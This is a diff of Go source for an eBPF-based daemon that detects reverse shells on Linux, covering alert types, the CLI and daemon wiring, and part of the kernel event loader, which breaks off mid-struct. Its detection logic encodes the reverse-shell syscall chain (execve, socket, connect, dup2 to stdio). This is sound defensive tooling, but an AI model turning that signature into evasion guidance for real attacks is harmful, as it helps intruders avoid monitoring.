+	hash := sha1.Sum([]byte(seed))
+	return hex.EncodeToString(hash[:8])
+}
+
+func scoreToSeverity(score float64) types.AlertSeverity {
+	switch {
+	case score >= 0.9:
+		return types.SeverityCritical
+	case score >= 0.7:
+		return types.SeverityHigh
+	case score >= 0.5:
+		return types.SeverityMedium
+	default:
+		return types.SeverityLow
+	}
+}
+
+func correlatedChain(state *correlation.SessionState) []string {
+	if state == nil {
+		return nil
+	}
+
+	out := make([]string, 0, 5)
+	if state.HasExecve {
+		out = append(out, "execve")
+	}
+	if state.HasSocket {
+		out = append(out, "socket")
+	}
+	if state.HasConnect {
+		out = append(out, "connect")
+	}
+	if state.HasDupToStdio {
+		out = append(out, "dup2")
+	}
+	if state.HasForkWithPipe {
+		out = append(out, "fork_pipe")
+	}
+	return out
+}
+
+func processComm(state *correlation.SessionState) string {
+	if state == nil {
+		return ""
+	}
+	if len(state.ProcessTree) > 0 {
+		return state.ProcessTree[len(state.ProcessTree)-1].Comm
+	}
+	if state.ExePath != "" {
+		return filepath.Base(state.ExePath)
+	}
+	if state.RemoteIP != nil && state.RemoteIP.Equal(net.IPv4zero) {
+		return "unknown"
+	}
+	return "unknown"
+}
+
+func primaryRuleID(fired []string) string {
+	if len(fired) == 0 {
+		return "RSBP-REV-SHELL-001"
+	}
+	return fired[0]
+}
+===== TYPES =====
+package types
+
+import "time"
+
+// SyscallEvent is the canonical telemetry message emitted by eBPF and consumed by userspace.
+// It preserves kernel-level fidelity while remaining sink-agnostic.
+type SyscallEvent struct {
+	PID            uint32
+	PPID           uint32
+	UID            uint32
+	GID            uint32
+	SyscallNr      uint32
+	FD             int32
+	RemoteIP4      uint32
+	RemoteIP6      [16]byte
+	RemotePort     uint16
+	Family         uint16
+	TimestampNS    uint64
+	Comm           [16]byte
+	ExecPath       [256]byte
+	Args           [512]byte
+	HasExecve      uint8
+	HasSocket      uint8
+	HasConnect     uint8
+	HasDup2Stdio   uint8
+	ForkParentPID  uint32
+	SuspiciousMask uint32
+}
+
+type AlertSeverity string
+
+const (
+	SeverityLow      AlertSeverity = "Low"
+	SeverityMedium   AlertSeverity = "Medium"
+	SeverityHigh     AlertSeverity = "High"
+	SeverityCritical AlertSeverity = "Critical"
+)
+
+type ProcessContext struct {
+	PID     uint32 `json:"pid" yaml:"pid"`
+	PPID    uint32 `json:"ppid" yaml:"ppid"`
+	UID     uint32 `json:"uid" yaml:"uid"`
+	GID     uint32 `json:"gid" yaml:"gid"`
+	Comm    string `json:"comm" yaml:"comm"`
+	Exe     string `json:"exe" yaml:"exe"`
+	Cmdline string `json:"cmdline" yaml:"cmdline"`
+}
+
+type NetworkContext struct {
+	RemoteIP       string `json:"remote_ip" yaml:"remote_ip"`
+	RemotePort     uint16 `json:"remote_port" yaml:"remote_port"`
+	Protocol       string `json:"protocol" yaml:"protocol"`
+	GeoIPCountry   string `json:"geoip_country" yaml:"geoip_country"`
+	GeoIPCity      string `json:"geoip_city" yaml:"geoip_city"`
+	ASN            string `json:"asn" yaml:"asn"`
+	AbuseIPDBScore int    `json:"abuseipdb_score" yaml:"abuseipdb_score"`
+}
+
+type ForensicsArtifact struct {
+	FDDump       bool   `json:"fd_dump" yaml:"fd_dump"`
+	FDDumpRef    string `json:"fd_dump_ref" yaml:"fd_dump_ref"`
+	CmdlineDump  bool   `json:"cmdline_dump" yaml:"cmdline_dump"`
+	CmdlineRef   string `json:"cmdline_ref" yaml:"cmdline_ref"`
+	SocketDump   bool   `json:"socket_dump" yaml:"socket_dump"`
+	SocketRef    string `json:"socket_ref" yaml:"socket_ref"`
+	MiniPCAPDump bool   `json:"mini_pcap_dump" yaml:"mini_pcap_dump"`
+	MiniPCAPRef  string `json:"mini_pcap_ref" yaml:"mini_pcap_ref"`
+}
+
+// ReverseShellAlert is the normalized, enriched, and correlatable security alert envelope.
+// Field names mirror the architecture contract so every sink receives consistent payloads.
+type ReverseShellAlert struct {
+	AlertID       string            `json:"alert_id" yaml:"alert_id"`
+	Timestamp     time.Time         `json:"timestamp" yaml:"timestamp"`
+	HostID        string            `json:"host_id" yaml:"host_id"`
+	SessionID     string            `json:"session_id" yaml:"session_id"`
+	EventChain    []string          `json:"event_chain" yaml:"event_chain"`
+	MITREAttack   []string          `json:"mitre_attack" yaml:"mitre_attack"`
+	Severity      AlertSeverity     `json:"severity" yaml:"severity"`
+	Confidence    float64           `json:"confidence" yaml:"confidence"`
+	RuleID        string            `json:"rule_id" yaml:"rule_id"`
+	Description   string            `json:"description" yaml:"description"`
+	Process       ProcessContext    `json:"process" yaml:"process"`
+	Network       NetworkContext    `json:"network" yaml:"network"`
+	Forensics     ForensicsArtifact `json:"forensics" yaml:"forensics"`
+	CorrelationID string            `json:"correlation_id" yaml:"correlation_id"`
+	Metadata      map[string]string `json:"metadata" yaml:"metadata"`
+}
+===== MAIN =====
+package main
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/signal"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"syscall"
+	"time"
+
+	"github.com/prometheus/client_golang/prometheus/promhttp"
+	"github.com/spf13/cobra"
+	"github.com/spf13/viper"
+	"go.uber.org/zap"
+	"golang.org/x/sys/unix"
+
+	"github.com/yoursec/rsbp/internal/alert"
+	"github.com/yoursec/rsbp/internal/api"
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/detection"
+	"github.com/yoursec/rsbp/internal/ebpf"
+	"github.com/yoursec/rsbp/internal/enrichment"
+	"github.com/yoursec/rsbp/internal/forensics"
+	"github.com/yoursec/rsbp/internal/output"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+var (
+	Version   = "dev"
+	BuildTime = "unknown"
+)
+
+type appConfig struct {
+	RSBP struct {
+		Agent struct {
+			Hostname string `mapstructure:"hostname"`
+			LogLevel string `mapstructure:"log_level"`
+			PIDFile  string `mapstructure:"pid_file"`
+		} `mapstructure:"agent"`
+		Detection struct {
+			WindowSeconds      int     `mapstructure:"window_seconds"`
+			ScoreThreshold     float64 `mapstructure:"score_threshold"`
+			AllowPrivateRemote bool    `mapstructure:"allow_private_remote"`
+			EnableBaseline     bool    `mapstructure:"enable_baseline"`
+			BaselineFile       string  `mapstructure:"baseline_file"`
+		} `mapstructure:"detection"`
+		Whitelist struct {
+			Paths        []string `mapstructure:"paths"`
+			IPs          []string `mapstructure:"ips"`
+			Users        []uint32 `mapstructure:"users"`
+			ProcessNames []string `mapstructure:"process_names"`
+		} `mapstructure:"whitelist"`
+		Enrichment struct {
+			GeoIPDBCity     string `mapstructure:"geoip_db_city"`
+			GeoIPDBASN      string `mapstructure:"geoip_db_asn"`
+			AbuseIPDBCache  string `mapstructure:"abuseipdb_cache"`
+			AbuseIPDBAPIKey string `mapstructure:"abuseipdb_api_key"`
+		} `mapstructure:"enrichment"`
+		Forensics struct {
+			Enabled          bool   `mapstructure:"enabled"`
+			OutputDir        string `mapstructure:"output_dir"`
+			CapturePCAP      bool   `mapstructure:"capture_pcap"`
+			PCAPDurationSecs int    `mapstructure:"pcap_duration_seconds"`
+			PCAPMaxBytes     int    `mapstructure:"pcap_max_bytes"`
+		} `mapstructure:"forensics"`
+		Outputs struct {
+			JSONL struct {
+				Enabled bool   `mapstructure:"enabled"`
+				Path    string `mapstructure:"path"`
+			} `mapstructure:"jsonl"`
+			Elasticsearch struct {
+				Enabled   bool     `mapstructure:"enabled"`
+				Addresses []string `mapstructure:"addresses"`
+				TLSCACert string   `mapstructure:"tls_ca_cert"`
+			} `mapstructure:"elasticsearch"`
+			Splunk struct {
+				Enabled bool   `mapstructure:"enabled"`
+				URL     string `mapstructure:"url"`
+				Token   string `mapstructure:"token"`
+			} `mapstructure:"splunk"`
+			Kafka struct {
+				Enabled bool     `mapstructure:"enabled"`
+				Brokers []string `mapstructure:"brokers"`
+				Topic   string   `mapstructure:"topic"`
+			} `mapstructure:"kafka"`
+			Syslog struct {
+				Enabled bool   `mapstructure:"enabled"`
+				Network string `mapstructure:"network"`
+				Address string `mapstructure:"address"`
+			} `mapstructure:"syslog"`
+			Webhook struct {
+				Enabled bool   `mapstructure:"enabled"`
+				URL     string `mapstructure:"url"`
+				Secret  string `mapstructure:"secret"`
+			} `mapstructure:"webhook"`
+		} `mapstructure:"outputs"`
+		API struct {
+			Enabled       bool   `mapstructure:"enabled"`
+			Listen        string `mapstructure:"listen"`
+			MetricsListen string `mapstructure:"metrics_listen"`
+			BearerToken   string `mapstructure:"bearer_token"`
+		} `mapstructure:"api"`
+	} `mapstructure:"rsbp"`
+}
+
+func main() {
+	rootCmd := &cobra.Command{
+		Use:   "rsbpd",
+		Short: "Reverse Shell Behavior Profiler daemon",
+	}
+
+	var cfgPath string
+	rootCmd.PersistentFlags().StringVar(&cfgPath, "config", "config/rsbp.yaml", "Path to config file")
+
+	runCmd := &cobra.Command{Use: "run", Short: "Start the daemon", RunE: func(cmd *cobra.Command, args []string) error {
+		return runDaemon(cfgPath)
+	}}
+
+	statusCmd := &cobra.Command{Use: "status", Short: "Print daemon status", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		return printJSONFromAPI("http://"+cfg.RSBP.API.Listen+"/health", cfg.RSBP.API.BearerToken)
+	}}
+
+	var follow bool
+	alertsCmd := &cobra.Command{Use: "alerts", Short: "Tail local alerts JSONL", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		return tailAlerts(cfg.RSBP.Outputs.JSONL.Path, follow)
+	}}
+	alertsCmd.Flags().BoolVar(&follow, "follow", false, "Follow appended alerts")
+
+	whitelistCmd := &cobra.Command{Use: "whitelist", Short: "Manage whitelist via API"}
+	var wlIP, wlPath string
+	whitelistAddCmd := &cobra.Command{Use: "add", Short: "Add whitelist entry", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		body := map[string]any{"ips": []string{}, "paths": []string{}}
+		if wlIP != "" {
+			body["ips"] = []string{wlIP}
+		}
+		if wlPath != "" {
+			body["paths"] = []string{wlPath}
+		}
+		return postJSON("http://"+cfg.RSBP.API.Listen+"/whitelist", body, cfg.RSBP.API.BearerToken)
+	}}
+	whitelistAddCmd.Flags().StringVar(&wlIP, "ip", "", "IP/CIDR whitelist entry")
+	whitelistAddCmd.Flags().StringVar(&wlPath, "path", "", "Executable path whitelist entry")
+	whitelistCmd.AddCommand(whitelistAddCmd)
+
+	testCmd := &cobra.Command{Use: "test", Short: "Run self-test via API synthetic event", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		return postJSON("http://"+cfg.RSBP.API.Listen+"/test", map[string]any{"source": "cli"}, cfg.RSBP.API.BearerToken)
+	}}
+
+	versionCmd := &cobra.Command{Use: "version", Short: "Print build and runtime version information", Run: func(cmd *cobra.Command, args []string) {
+		fmt.Printf("version=%s\nbuild_time=%s\ngo=%s\nkernel_requirement=%s\n", Version, BuildTime, runtime.Version(), ">=5.8")
+	}}
+
+	rootCmd.AddCommand(runCmd, statusCmd, alertsCmd, whitelistCmd, testCmd, versionCmd)
+	if err := rootCmd.Execute(); err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+}
+
+func runDaemon(configPath string) error {
+	cfg, err := loadConfig(configPath)
+	if err != nil {
+		return err
+	}
+
+	logger, err := newConfiguredLogger(cfg.RSBP.Agent.LogLevel)
+	if err != nil {
+		return fmt.Errorf("logger init failed: %w", err)
+	}
+	defer func() {
+		_ = logger.Sync()
+	}()
+
+	rootCtx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	if cfg.RSBP.Agent.Hostname == "" {
+		hostname, hostErr := os.Hostname()
+		if hostErr == nil {
+			cfg.RSBP.Agent.Hostname = hostname
+		} else {
+			cfg.RSBP.Agent.Hostname = "unknown-host"
+		}
+	}
+
+	hostOS := detectOSName()
+	kernelVersion := detectKernelVersion()
+	agentVersion := Version
+	if strings.TrimSpace(agentVersion) == "" {
+		agentVersion = "dev"
+	}
+
+	if cfg.RSBP.Agent.PIDFile != "" {
+		_ = os.WriteFile(cfg.RSBP.Agent.PIDFile, []byte(strconv.Itoa(os.Getpid())), 0o644)
+		defer os.Remove(cfg.RSBP.Agent.PIDFile)
+	}
+
+	var eventsProcessed atomic.Uint64
+
+	eventCh := make(chan types.SyscallEvent, 10000)
+	rawAlertCh := make(chan *types.ReverseShellAlert, 1024)
+	finalAlertCh := make(chan *types.ReverseShellAlert, 1024)
+
+	ebpfLoader, err := ebpf.New(logger)
+	if err != nil {
+		logger.Fatal("failed to initialize ebpf loader", zap.Error(err))
+	}
+	defer func() {
+		if closeErr := ebpfLoader.Close(); closeErr != nil {
+			logger.Warn("failed to close ebpf loader", zap.Error(closeErr))
+		}
+	}()
+
+	tracker := correlation.NewTrackerWithLogger(time.Duration(cfg.RSBP.Detection.WindowSeconds)*time.Second, logger)
+	correlation.SetAllowPrivateRemote(cfg.RSBP.Detection.AllowPrivateRemote)
+	detector := detection.NewEngine(detection.Config{
+		ExecConnectWindowSeconds: cfg.RSBP.Detection.WindowSeconds,
+		MinScore:                 cfg.RSBP.Detection.ScoreThreshold,
+		EnableBaseline:           cfg.RSBP.Detection.EnableBaseline,
+		BaselineFile:             cfg.RSBP.Detection.BaselineFile,
+		Whitelist: detection.WhitelistConfig{
+			Paths:        append([]string(nil), cfg.RSBP.Whitelist.Paths...),
+			IPs:          append([]string(nil), cfg.RSBP.Whitelist.IPs...),
+			Users:        append([]uint32(nil), cfg.RSBP.Whitelist.Users...),
+			ProcessNames: append([]string(nil), cfg.RSBP.Whitelist.ProcessNames...),
+		},
+	}, logger)
+	enricher := enrichment.NewEnricher(enrichment.Config{
+		GeoIPDBPath:      cfg.RSBP.Enrichment.GeoIPDBCity,
+		ASNDBPath:        cfg.RSBP.Enrichment.GeoIPDBASN,
+		AbuseCachePath:   cfg.RSBP.Enrichment.AbuseIPDBCache,
+		AbuseIPDBAPIKey:  cfg.RSBP.Enrichment.AbuseIPDBAPIKey,
+		AbuseIPDBEnabled: cfg.RSBP.Enrichment.AbuseIPDBAPIKey != "",
+	}, logger)
+	collector := forensics.NewCollector(forensics.Config{
+		ArtifactDir:    cfg.RSBP.Forensics.OutputDir,
+		EnableMiniPCAP: cfg.RSBP.Forensics.Enabled && cfg.RSBP.Forensics.CapturePCAP,
+	}, logger)
+	collectorCfg := forensics.CollectorConfig{
+		PCAPDuration: time.Duration(cfg.RSBP.Forensics.PCAPDurationSecs) * time.Second,
+		PCAPMaxBytes: int64(cfg.RSBP.Forensics.PCAPMaxBytes),
+	}
+
+	outputCfg := output.Config{}
+	if cfg.RSBP.Outputs.JSONL.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "jsonl")
+	}
+	if cfg.RSBP.Outputs.Elasticsearch.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "elasticsearch")
+	}
+	if cfg.RSBP.Outputs.Splunk.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "splunk")
+	}
+	if cfg.RSBP.Outputs.Kafka.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "kafka")
+	}
+	if cfg.RSBP.Outputs.Syslog.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "syslog")
+	}
+	if cfg.RSBP.Outputs.Webhook.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "webhook")
+	}
+	outputCfg.JSONL.Path = cfg.RSBP.Outputs.JSONL.Path
+	outputCfg.Elasticsearch.Addresses = cfg.RSBP.Outputs.Elasticsearch.Addresses
+	outputCfg.Elasticsearch.CertPath = cfg.RSBP.Outputs.Elasticsearch.TLSCACert
+	outputCfg.Splunk.Endpoint = cfg.RSBP.Outputs.Splunk.URL
+	outputCfg.Splunk.Token = cfg.RSBP.Outputs.Splunk.Token
+	outputCfg.Splunk.Hostname = cfg.RSBP.Agent.Hostname
+	outputCfg.Kafka.Brokers = cfg.RSBP.Outputs.Kafka.Brokers
+	outputCfg.Kafka.Topic = cfg.RSBP.Outputs.Kafka.Topic
+	outputCfg.Syslog.Network = cfg.RSBP.Outputs.Syslog.Network
+	outputCfg.Syslog.Address = cfg.RSBP.Outputs.Syslog.Address
+	outputCfg.Webhook.URL = cfg.RSBP.Outputs.Webhook.URL
+	outputCfg.Webhook.Secret = cfg.RSBP.Outputs.Webhook.Secret
+
+	sinks, err := output.NewSinks(outputCfg, logger)
+	if err != nil {
+		return fmt.Errorf("failed to initialize outputs: %w", err)
+	}
+	defer sinks.Close()
+	emitter := alert.NewEmitter(sinks, logger)
+
+	var wg sync.WaitGroup
+
+	// Kernel event collection runs independently so userspace processing can apply backpressure.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer close(eventCh)
+		if runErr := ebpfLoader.Run(rootCtx, eventCh); runErr != nil && !errors.Is(runErr, context.Canceled) {
+			logger.Error("ebpf collector exited with error", zap.Error(runErr))
+			cancel()
+		}
+	}()
+
+	// Correlation and detection stay together to preserve event ordering per PID.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer close(rawAlertCh)
+		for ev := range eventCh {
+			eventsProcessed.Add(1)
+			session := tracker.Consume(ev)
+			alerts := detector.Evaluate(session, ev, cfg.RSBP.Agent.Hostname)
+			for _, a := range alerts {
+				select {
+				case rawAlertCh <- a:
+				case <-rootCtx.Done():
+					return
+				}
+			}
+		}
+	}()
+
+	// Enrichment and forensic collection happen after detection to limit expensive operations.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer close(finalAlertCh)
+		for a := range rawAlertCh {
+			if a.Metadata == nil {
+				a.Metadata = map[string]string{}
+			}
+			a.Metadata["hostname"] = cfg.RSBP.Agent.Hostname
+			a.Metadata["os"] = hostOS
+			a.Metadata["kernel_version"] = kernelVersion
+			a.Metadata["agent_version"] = agentVersion
+			enricher.EnrichAlert(rootCtx, a)
+			if cfg.RSBP.Forensics.Enabled {
+				collector.Collect(rootCtx, a, collectorCfg)
+			}
+			select {
+			case finalAlertCh <- a:
+			case <-rootCtx.Done():
+				return
+			}
+		}
+	}()
+
+	if cfg.RSBP.API.Enabled {
+		if cfg.RSBP.API.MetricsListen != "" {
+			go func() {
+				mux := http.NewServeMux()
+				mux.Handle("/metrics", promhttp.Handler())
+				_ = (&http.Server{Addr: cfg.RSBP.API.MetricsListen, Handler: mux}).ListenAndServe()
+			}()
+		}
+
+		apiSrv := api.NewServer(api.Config{
+			Enabled:       cfg.RSBP.API.Enabled,
+			Listen:        cfg.RSBP.API.Listen,
+			MetricsListen: cfg.RSBP.API.MetricsListen,
+			BearerToken:   cfg.RSBP.API.BearerToken,
+			AlertsPath:    cfg.RSBP.Outputs.JSONL.Path,
+		}, logger, &eventsProcessed, func() map[string]any {
+			return map[string]any{"ebpf": ebpfLoader.Stats()}
+		}, func(context.Context) error {
+			_, err := loadConfig(configPath)
+			return err
+		}, func(context.Context) error {
+			synthetic := types.SyscallEvent{PID: 99999, TimestampNS: uint64(time.Now().UnixNano())}
+			select {
+			case eventCh <- synthetic:
+				return nil
+			default:
+				return fmt.Errorf("event channel busy")
+			}
+		})
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			if err := apiSrv.Run(rootCtx); err != nil && !errors.Is(err, http.ErrServerClosed) {
+				logger.Error("api server failed", zap.Error(err))
+				cancel()
+			}
+		}()
+	}
+
+	// Emission is isolated from detection to avoid sink outages blocking core telemetry.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		for a := range finalAlertCh {
+			if emitErr := emitter.Emit(rootCtx, a); emitErr != nil {
+				logger.Error("failed to emit alert", zap.String("alert_id", a.AlertID), zap.Error(emitErr))
+			}
+		}
+	}()
+
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+
+	select {
+	case sig := <-sigCh:
+		logger.Info("shutdown signal received", zap.String("signal", sig.String()))
+		cancel()
+	case <-rootCtx.Done():
+	}
+
+	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer shutdownCancel()
+
+	finished := make(chan struct{})
+	go func() {
+		defer close(finished)
+		wg.Wait()
+	}()
+
+	select {
+	case <-finished:
+		logger.Info("daemon stopped cleanly")
+	case <-shutdownCtx.Done():
+		logger.Warn("graceful shutdown timed out")
+	}
+
+	if err := detector.SaveBaseline(); err != nil {
+		logger.Warn("failed to save baseline", zap.Error(err))
+	}
+
+	return nil
+}
+
+func loadConfig(configPath string) (*appConfig, error) {
+	v := viper.New()
+	v.SetConfigFile(configPath)
+	v.SetConfigType("yaml")
+	v.SetDefault("rsbp.agent.log_level", "info")
+	v.SetDefault("rsbp.agent.hostname", "")
+	v.SetDefault("rsbp.agent.pid_file", "/var/run/rsbp.pid")
+	v.SetDefault("rsbp.detection.window_seconds", 5)
+	v.SetDefault("rsbp.detection.score_threshold", 0.5)
+	v.SetDefault("rsbp.detection.allow_private_remote", true)
+	v.SetDefault("rsbp.detection.enable_baseline", true)
+	v.SetDefault("rsbp.detection.baseline_file", "/var/lib/rsbp/baseline.json")
+	v.SetDefault("rsbp.outputs.jsonl.enabled", true)
+	v.SetDefault("rsbp.outputs.jsonl.path", "/var/log/rsbp/alerts.jsonl")
+	v.SetDefault("rsbp.api.enabled", true)
+	v.SetDefault("rsbp.api.listen", "127.0.0.1:9001")
+	v.SetDefault("rsbp.api.metrics_listen", "0.0.0.0:9090")
+
+	if err := v.ReadInConfig(); err != nil {
+		return nil, fmt.Errorf("read config: %w", err)
+	}
+
+	var cfg appConfig
+	if err := v.Unmarshal(&cfg); err != nil {
+		return nil, fmt.Errorf("unmarshal config: %w", err)
+	}
+
+	return &cfg, nil
+}
+
+func printJSONFromAPI(url string, bearerToken string) error {
+	req, err := http.NewRequest(http.MethodGet, url, nil)
+	if err != nil {
+		return err
+	}
+	if bearerToken != "" {
+		req.Header.Set("Authorization", "Bearer "+bearerToken)
+	}
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode >= 300 {
+		body, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("api status %d: %s", resp.StatusCode, string(body))
+	}
+	var pretty bytes.Buffer
+	if err := json.Indent(&pretty, mustReadAll(resp.Body), "", "  "); err != nil {
+		return err
+	}
+	fmt.Println(pretty.String())
+	return nil
+}
+
+func postJSON(url string, body any, bearerToken string) error {
+	payload, err := json.Marshal(body)
+	if err != nil {
+		return err
+	}
+	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payload))
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Content-Type", "application/json")
+	if bearerToken != "" {
+		req.Header.Set("Authorization", "Bearer "+bearerToken)
+	}
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	respBody, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode >= 300 {
+		return fmt.Errorf("api status %d: %s", resp.StatusCode, string(respBody))
+	}
+	fmt.Println(string(respBody))
+	return nil
+}
+
+func tailAlerts(path string, follow bool) error {
+	ch, err := output.TailAlerts(path, follow)
+	if err != nil {
+		return err
+	}
+	enc := json.NewEncoder(os.Stdout)
+	enc.SetIndent("", "  ")
+	for a := range ch {
+		if err := enc.Encode(a); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func mustReadAll(r io.Reader) []byte {
+	b, _ := io.ReadAll(r)
+	return b
+}
+
+func newConfiguredLogger(levelRaw string) (*zap.Logger, error) {
+	level := zap.InfoLevel
+	normalized := strings.ToLower(strings.TrimSpace(levelRaw))
+	if normalized == "" {
+		normalized = "info"
+	}
+	if err := level.Set(normalized); err != nil {
+		logger, logErr := zap.NewProduction(zap.IncreaseLevel(zap.NewAtomicLevelAt(zap.InfoLevel)))
+		if logErr != nil {
+			return nil, logErr
+		}
+		logger.Warn("invalid log level configured, defaulting to info", zap.String("configured", levelRaw))
+		return logger, nil
+	}
+
+	atomicLevel := zap.NewAtomicLevelAt(level)
+	logger, err := zap.NewProduction(zap.IncreaseLevel(atomicLevel))
+	if err != nil {
+		return nil, err
+	}
+	return logger, nil
+}
+
+func detectOSName() string {
+	data, err := os.ReadFile("/etc/os-release")
+	if err != nil {
+		return runtime.GOOS
+	}
+	for _, line := range strings.Split(string(data), "\n") {
+		line = strings.TrimSpace(line)
+		if !strings.HasPrefix(line, "PRETTY_NAME=") {
+			continue
+		}
+		value := strings.TrimPrefix(line, "PRETTY_NAME=")
+		return strings.Trim(value, "\"")
+	}
+	return runtime.GOOS
+}
+
+func detectKernelVersion() string {
+	var u unix.Utsname
+	if err := unix.Uname(&u); err != nil {
+		return ""
+	}
+	buf := make([]byte, 0, len(u.Release))
+	for _, c := range u.Release {
+		if c == 0 {
+			break
+		}
+		buf = append(buf, byte(c))
+	}
+	return string(buf)
+}
+
+===== STEP 2: SUPPORTING FILES =====
+===== LOADER =====
+package ebpf
+
+import (
+	"bufio"
+	"bytes"
+	"context"
+	"encoding/binary"
+	"errors"
+	"fmt"
+	"os"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"github.com/cilium/ebpf"
+	"github.com/cilium/ebpf/link"
+	"github.com/cilium/ebpf/ringbuf"
+	"github.com/cilium/ebpf/rlimit"
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+type Stats struct {
+	EventsRead     uint64
+	LostEvents     uint64
+	AttachedProbes int
+}
+
+type Loader struct {
+	logger *zap.Logger
+
+	coll     *ebpf.Collection
+	reader   *ringbuf.Reader
+	links    []link.Link
+	bootTime time.Time
+
+	eventsRead atomic.Uint64
+	lostEvents atomic.Uint64
+
+	closeOnce sync.Once
+}
+
+type rawSyscallEvent struct {
+	PID            uint32
+	PPID           uint32
+	UID            uint32
+	GID            uint32
+	SyscallNr      uint32
+	FD             int32
+	RemoteIP4      uint32
+	RemoteIP6      [16]byte
+	RemotePort     uint16
+	Family         uint16
+	TimestampNS    uint64
+	Comm           [16]byte
+	ExecPath       [256]byte
+	Args           [512]byte
+	HasExecve      uint8
+	HasSocket      uint8
+	HasConnect     uint8
+	HasDup2Stdio   uint8
+	ForkParentPID  uint32
+	SuspiciousMask uint32
+}
+
+func New(logger *zap.Logger) (*Loader, error) {
+	if logger == nil {
+		return nil, fmt.Errorf("ebpf loader: %w", fmt.Errorf("logger is nil"))
+	}
+
+	if err := ensureKernelVersion(); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+	if err := ensurePrivileges(); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+	if err := rlimit.RemoveMemlock(); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	var objs bpfObjects
+	if err := loadBpfObjects(&objs, nil); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	spec, err := loadBpf()
+	if err != nil {
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	coll, err := ebpf.NewCollection(spec)
+	if err != nil {
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	links, err := attachTracepoints(coll)
+	if err != nil {
+		coll.Close()
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	eventsMap, ok := coll.Maps["events"]
+	if !ok {
+		for _, lnk := range links {
+			_ = lnk.Close()
+		}
+		coll.Close()
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", fmt.Errorf("events map not found"))
+	}
+
+	reader, err := ringbuf.NewReader(eventsMap)
+	if err != nil {
+		for _, lnk := range links {
+			_ = lnk.Close()
+		}
+		coll.Close()
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	_ = objs.Close()
+
+	return &Loader{
+		logger:   logger,
+		coll:     coll,
+		reader:   reader,
+		links:    links,
+		bootTime: getBootTime(),
+	}, nil
+}
+
+func (l *Loader) Run(ctx context.Context, events chan<- types.SyscallEvent) error {
+	if l == nil {
+		return fmt.Errorf("ebpf loader: %w", fmt.Errorf("loader is nil"))
+	}
+	if l.reader == nil {
+		return fmt.Errorf("ebpf loader: %w", fmt.Errorf("reader is not initialized"))
+	}
+
+	errCh := make(chan error, 1)
+
+	go func() {
+		defer close(errCh)
+		for {
+			record, err := l.reader.Read()
+			if err != nil {
+				if errors.Is(err, ringbuf.ErrClosed) {
+					errCh <- nil
+					return
+				}
+				errCh <- fmt.Errorf("ebpf loader: %w", err)
+				return
+			}
+
+			var raw rawSyscallEvent
+			if err := binary.Read(bytes.NewReader(record.RawSample), binary.LittleEndian, &raw); err != nil {
+				l.lostEvents.Add(1)
+				l.logger.Warn("failed to decode raw sample", zap.Error(err))
+				continue
+			}
+
+			event := types.SyscallEvent{
+				PID:            raw.PID,
+				PPID:           raw.PPID,
+				UID:            raw.UID,
+				GID:            raw.GID,
+				SyscallNr:      raw.SyscallNr,
+				FD:             raw.FD,
+				RemoteIP4:      raw.RemoteIP4,
+				RemoteIP6:      raw.RemoteIP6,
+				RemotePort:     raw.RemotePort,
+				Family:         raw.Family,
+				TimestampNS:    toUnixTimestampNS(l.bootTime, raw.TimestampNS),
+				Comm:           raw.Comm,
+				ExecPath:       raw.ExecPath,
+				Args:           raw.Args,
+				HasExecve:      raw.HasExecve,
+				HasSocket:      raw.HasSocket,
+				HasConnect:     raw.HasConnect,
